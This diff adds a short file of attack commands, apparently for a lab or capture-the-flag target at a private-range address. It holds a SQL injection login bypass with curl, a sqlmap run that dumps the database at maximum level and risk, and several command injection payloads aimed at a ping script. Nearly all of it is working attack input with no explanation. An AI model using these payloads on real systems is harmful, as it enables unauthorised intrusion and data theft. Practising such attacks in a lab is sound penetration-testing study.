@@ -1,0 +1,19 @@
+# Authentication bypass
+
+curl -X POST http://192.168.56.106/index.php \
+-d "uname=admin' OR '1'='1&psw=test&btnLogin=Login"
+
+# SQLMap enumeration
+
+sqlmap -u "http://192.168.56.106/index.php" \
+--data="uname=admin&psw=test&btnLogin=Login" \
+--level=5 --risk=3 --batch --dump
+
+# Command injection tests
+
+curl -X POST http://192.168.56.106/pingit.php -d "ip=127.0.0.1;id"
+curl -X POST http://192.168.56.106/pingit.php -d "ip=127.0.0.1;echo PWNED"
+curl -X POST http://192.168.56.106/pingit.php -d "ip=127.0.0.1 && id"
+curl -X POST http://192.168.56.106/pingit.php -d "ip=127.0.0.1 | id"
+curl -X POST http://192.168.56.106/pingit.php -d "ip=\`id\`"
+curl -X POST http://192.168.56.106/pingit.php -d "ip=$(id)"
